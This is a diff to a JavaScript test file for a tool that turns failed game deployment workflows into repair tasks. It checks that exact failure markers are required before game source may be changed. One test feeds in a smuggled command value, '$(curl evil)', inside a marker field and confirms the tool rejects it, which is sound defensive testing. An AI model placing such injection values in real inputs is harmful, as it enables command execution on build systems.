@@ -531,7 +531,11 @@ test('canonical deployment failures are scoped to a real game source and preserv
     head_repository:{full_name:'hans1177/jaewoon-games'}
   };
   const jobs={jobs:[{name:'build',conclusion:'failure',
-    steps:[{name:'Mark Unity Web floor repair requirement',conclusion:'failure'}]}]};
+    steps:[{name:'Mark Unity Web floor repair requirement',conclusion:'failure'}]}],
+    failureMarkers:[
+      'UNITY_WEB_REPAIR_FAILURE_STAGE=UNITY_WEB_CSHARP_COMPILE',
+      'UNITY_WEB_REPAIR_FAILURE_SIGNATURE=UNITY_WEB_CSHARP_COMPILE_ERROR:Assets/Scripts/UnityWebFloorGame.cs:14:CS0246'
+    ]};
   const catalog={games:[{id:'fantasy-survival',productionClass:'DEVELOPMENT_CONFIRMED'}]};
   const first=escalateDeploymentFailure({event:{workflow_run:run},jobsInput:jobs,catalogInput:catalog});
   assert.equal(first.added.length,1);
@@ -551,6 +555,8 @@ test('canonical deployment failures are scoped to a real game source and preserv
   assert.equal(task.sourceMutationRequired,true);
   assert.equal(task.gameRepairContract.impactRegressionRequired,true);
   assert.ok(task.acceptanceCriteria.some(value=>value.includes('existing gameplay saves balance')));
+  assert.equal(first.queue.tasks[0].failureStage,'UNITY_WEB_CSHARP_COMPILE');
+  assert.equal(first.queue.tasks[0].failureSignature,'UNITY_WEB_CSHARP_COMPILE_ERROR:Assets/Scripts/UnityWebFloorGame.cs:14:CS0246');
   const duplicate=escalateDeploymentFailure({event:{workflow_run:run},jobsInput:jobs,catalogInput:catalog,recoveryInput:dispatched.recovery});
   assert.equal(duplicate.queue.tasks.length,1);
   assert.deepEqual(duplicate.added,[]);
@@ -614,4 +620,38 @@ test('deployment failure signals reject success, spoofed workflows and unrelated
   assert.equal(unknown.owner,'SYSTEM_AI');
   assert.equal(unknown.queue.tasks[0].gameId,null);
   assert.equal(unknown.queue.tasks[0].responsibleFiles[0],'.github/workflows/vibe2-candidate-release.yml');
+});
+
+
+test('ambiguous Unity Web build failures cannot mutate game source without exact failure evidence',async()=>{
+  const {escalateDeploymentFailure}=await import('../tools/company-recovery-escalation.mjs');
+  const run={
+    name:'Unity Web Development Floor',path:'.github/workflows/unity-web-first-stage-build.yml',
+    conclusion:'failure',id:38121720423,head_sha:'d'.repeat(40),
+    display_title:'Unity Web Floor fantasy-survival',head_repository:{full_name:'hans1177/jaewoon-games'}
+  };
+  const jobs={jobs:[{name:'build',conclusion:'failure',
+    steps:[{name:'Mark Unity Web floor repair requirement',conclusion:'failure'}]}]};
+  const catalogInput={games:[{id:'fantasy-survival',productionClass:'DEVELOPMENT_CONFIRMED'}]};
+  const missingMarkers=escalateDeploymentFailure({event:{workflow_run:run},jobsInput:jobs,catalogInput});
+  assert.equal(missingMarkers.owner,'SYSTEM_AI');
+  assert.deepEqual(missingMarkers.queue.tasks[0].responsibleFiles,['.github/workflows/unity-web-first-stage-build.yml']);
+  const publishMarker=escalateDeploymentFailure({event:{workflow_run:run},
+    jobsInput:{...jobs,failureMarkers:['UNITY_WEB_REPAIR_FAILURE_STAGE=UNITY_WEB_BUILD_OR_READINESS']},catalogInput});
+  assert.equal(publishMarker.owner,'SYSTEM_AI');
+  const malformed=escalateDeploymentFailure({event:{workflow_run:run},
+    jobsInput:{...jobs,failureMarkers:['UNITY_WEB_REPAIR_FAILURE_STAGE=$(curl evil)']},catalogInput});
+  assert.equal(malformed.owner,'SYSTEM_AI');
+});
+
+test('fast recovery reuses canonical policies and listens to all three deployment surfaces',()=>{
+  const workflow=fs.readFileSync(new URL('../.github/workflows/vibe2-recovery-fast.yml',import.meta.url),'utf8');
+  for(const name of ['Vibe2 Candidate Release Gate','Unity Web Development Floor',
+    'Company DEVELOPMENT_CONFIRMED Roblox Private Runtime Candidate Deployment','Magic Forest Static Play']){
+    assert.ok(workflow.includes('      - '+name));
+  }
+  assert.match(workflow,/node tools\/company-shared-context\.mjs/);
+  assert.match(workflow,/--deployment-event=\$GITHUB_EVENT_PATH/);
+  assert.match(workflow,/node tools\/company-recovery-dispatch\.mjs --route=all/);
+  assert.match(workflow,/unity-web.*?failure|UNITY_WEB_REPAIR_FAILURE_/s);
 });
